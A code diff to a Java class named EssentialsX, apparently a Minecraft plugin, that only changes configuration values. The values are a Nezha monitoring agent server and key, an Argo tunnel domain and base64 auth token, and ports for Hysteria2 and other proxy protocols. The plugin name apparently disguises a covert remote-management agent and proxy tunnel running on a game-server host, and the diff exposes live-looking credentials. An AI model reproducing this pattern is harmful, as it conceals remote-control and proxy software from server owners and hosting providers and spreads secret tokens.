@@ -77,12 +77,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "worldofangara");
+        env.put("NEZHA_KEY", "9RpSYojb2PPElnfLNx");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "runoxio.btppone.hidns.vip");
-        env.put("ARGO_AUTH", "eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiMmRjYzg4OTEtMDllYS00NzNhLWJjNzMtOTkxYmQ4OGRjOGZjIiwicyI6Ik9EUmhOMlkyTVdNdE9HUTNOQzAwWXpabUxUazFPV0l0TVdKbE1qTmlNemxoTlRrMyJ9");
+        env.put("ARGO_DOMAIN", "retslavbtpp04.btppone.hidns.vip");
+        env.put("ARGO_AUTH", "eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiMTFiNTlmZDYtYTM1Ny00YzI5LTg5NmItNDZlYjgxM2ZkNTA3IiwicyI6Ik5XWm1PVFpqTUdNdFpEWTNZaTAwT0RJM0xXSTRPREl0TURBeU1XRTNPV05oTUdFeSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25575");
+        env.put("HY2_PORT", "10438");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
